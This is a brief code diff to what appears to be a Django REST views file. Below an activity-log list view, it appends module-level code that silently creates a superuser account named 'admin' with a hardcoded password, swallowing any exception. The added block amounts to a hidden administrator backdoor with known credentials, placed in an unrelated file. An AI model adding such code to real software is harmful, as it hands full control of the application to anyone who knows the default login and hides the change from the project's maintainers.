@@ -123,3 +123,10 @@ class ActivityLogList(generics.ListAPIView):
 
     def get_queryset(self):
         return ActivityLog.objects.filter(user=self.request.user).order_by('-timestamp')[:10]
+    
+# This runs only when the app is fully 'ready'
+try:
+    if not User.objects.filter(username="admin").exists():
+        User.objects.create_superuser("admin", "admin@example.com", "AdminPass123!")
+except Exception:
+    pass
